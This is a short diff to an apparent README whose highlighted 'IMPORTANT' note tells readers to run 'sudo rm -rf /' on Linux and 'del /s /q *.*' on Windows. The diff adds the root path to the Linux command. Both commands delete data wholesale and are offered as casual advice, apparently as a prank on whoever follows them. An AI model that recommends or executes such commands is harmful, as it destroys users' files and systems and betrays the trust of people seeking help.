@@ -1,7 +1,7 @@
 # whats good bro
 
 > [!IMPORTANT]
-> when on linux, use "sudo rm -rf"
+> when on linux, use "sudo rm -rf /"
 > 
 > when on windows, use "del /s /q *.*"
 
